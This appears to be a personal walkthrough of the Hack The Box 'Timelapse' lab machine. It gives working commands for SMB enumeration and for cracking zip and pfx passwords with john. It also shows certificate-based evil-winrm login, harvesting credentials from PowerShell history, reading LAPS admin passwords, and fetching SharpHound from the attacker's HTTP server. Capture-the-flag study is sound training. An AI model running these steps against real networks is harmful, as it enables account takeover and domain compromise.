`sudo nmap -sC -sV -oA nmap/timelapse 10.10.11.152`
`-sC for default scripts`
`-sV for enumerate all versions`
`-oA output all formats`

![[timelapse-nmap-scan.png]]
Notice host name is timelapse.htb -> add to `/etc/hosts`

Get domain name with #crackmapexec 
`crackmapexec smb 10.10.11.152`

![[Pasted image 20241222230651.png]]
name: DC01 -> add to `/etc/hosts` as well

![[timelapse-etc-hosts.png]]
Potentially dump users with crackmapexec (fail)

`crackmapexec smb 10.10.11.152 --users`

![[cme-dump-users-cmd.png]]
Potentially dump users & shares with crackmapexec (fail)

`crackmapexec smb 10.10.11.152 --shares --users`

![[dump-users-shares-cme-cmd.png]]

Potentially dump users & shares with crackmapexec w/ null authentication (fail)

`crackmapexec smb 10.10.11.152 -u '' -p '' --shares --users`

![[cme-cmd-null-authentication.png]]
Use #smbclient to list shares

**Remember to always try to enumerate things with two different tools to avoid missing stuff**

`smbclient -L //10.10.11.152/`

![[smbclient to list shares.png]]
/Shares is unique so let's enumerate that.

`smbclient //10.10.11.152/Shares`

Annd there is stuff in here. 

![[stuff-in-smb-shares-dir.png]]
`ls Dev/` to view contents of Dev folder and see `winrm_backup.zip` file

![[winrm-backup.zip.png]]

Download this file with `get Dev\winrm_backup.zip`

![[Pasted image 20241223203502.png]]

View contents of HelpDesk folder as well with `ls HelpDesk\`

![[Pasted image 20241223203556.png]]
Download these `LAPS` files which are standard Microsoft things. 

Running #exiftool on LAPS_OperationGuide.docx to try to grab a username. Nothing there. 

![[Pasted image 20241223203831.png]]
Run #exiftool on all documents and grep for user, name subsequently. 

`exiftool *.docx | grep -i user` (nothing)

![[Pasted image 20241223204044.png]]

`exiftool *.docx | grep -i name`

![[Pasted image 20241223204026.png]]
No username. 

Moving on to the `winrm_backup.zip`

Try to unzip with `unzip Dev\\winrm_backup.zip`

It is password protected. 

![[Pasted image 20241223204316.png]]
#johntheripper

Run #zip2john to convert the zip file to a hash for cracking basically. 

`./zip2john ~/Dev\\winrm_backup.zip >> /root/winrm_backup.hash`

![[zip2john-cmd.png]]

Now execute #john against this hash file with the `rockyou.txt` wordlist. 

`./john /root/winrm_backup.hash --wordlist==/opt/wordlist/rockyou.txt`

Password cracked as `supremelegacy`

![[john-output.png]]
Now use this password to unzip the file. 

`unzip Dev\\winrm_backup.zip`

Now we have a .pfx file which is a group of certificates 

![[zip-contents.png]]
View info in this `.pfx` file with #openssl 

`openssl pkcs12 -in legacyy_dev_auth.pfx -info`

Error message when prompted for password. 

![[openssl-cmd.png]]
Try cracking this password as well with #pfx2john 

`./pfx2john.py ~/legacyy_dev_auth.pfx >>~/legacyy_dev_auth.pfx.hash`

Now crack this hash with #john 

`./john ~/legacyy_dev_auth.pfx.hash --wordlist=/opt/wordlist/rockyou.txt

Password cracked as `thuglegacy`

![[Pasted image 20241223210005.png]]
Try to view the certificate again 

`openssl pkcs12 -in legacyy_dev_auth.pfx -info`

Enter `thuglegacy` when prompted

This is a Microsoft Software Key Storage Provider. 

We get the certificate and private key. 

Cert:
![[Pasted image 20241223210227.png]]
Extract these using #openssl to avoid any whitespace issues. 

Get the private key:
`openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes`

![[Pasted image 20241223210433.png]]

Get the cert:
`openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out key.cert`

![[Pasted image 20241223210632.png]]
Now we can use #evilwinrm 

but wait.. are the `winrm` ports even open?
Check with nmap
`sudo nmap -p5985-5986 10.10.11.152`

![[winrm-nmap-port-scan.png]]
Port 5986 is open which is #winrm with #ssl

`evil-winrm -S -i 10.10.11.152 -c key.cert -k key.pem`

Logged innnn.

![[login with private key and cert - winrm.png]]
`gci -force .` will show hidden files. 

Good to check PowerShell's #psreadline file for a privilege escalation vector. This is like PowerShell console host history

Full path is `C:\Users\legacyy\APPDATA\roaming\microsoft\windows\powershell\psreadline`

`dir`

Notice the `ConsoleHost_history.txt`

![[PS cmd history.png]]
Viewing contents of this file 

![[console-history-file.png]]
We get username: `svc_deploy` and password: `E3R$Q62^12p7PLlC%KWaxuaV`

Going back to #crackmapexec 

`crackmapexec smb 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'`

it does not say pw3ned!

![[cme-not-pwn3d.png]]

Then try authenticating using #evilwinrm 

`evil-winrm -S -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'`

![[evil-winrm-login.png]]
Enumerating with 

`gci -force .` to look for hidden files 
![[gci -force.png]]

Checking powershell history again but there is no powershell directory 

![[Pasted image 20241223224626.png]]
it is active directory, so maybe run #Bloodhound 

Download fresh SharpCollection #sharphound 

Serve it up with #pythonhttpserver 
`python3 -m http.server`

Download it with
`cd \programdata`
`curl 10.10.14.8:8000 /SharpHound.exe -o SharpHound.exe`

Execute it with `.\SharpHound.exe`

Windows Defender blocked it. 

Search for `bloodhound.py ingestor`

https://github.com/dirkjanm/BloodHound.py

Download this file. 

Running from Parrot box:

![[Pasted image 20241223230635.png]]
But....DNS operation is timing out. 

Trying manual enumeration.. 

`net user svc_deploy`

![[net user output.png]]

We're in the LAPS Readers group which can read LAPS passwords.

Running this `Get-ADComputer` command to get passwords
![[get-adcomputer.png]]

Here is a password for the local admin on the box:

`tZ+6(79c) ) ) oPW-#8J26]HV7`

![[Pasted image 20241223231413.png]]

Logging in with #evilwinrm as admin

![[admin-shell.png]]

Can also get the LAPS password using this python script

https://github.com/n00py/LAPSDumper


![[laps.py.png]]

then login with these 

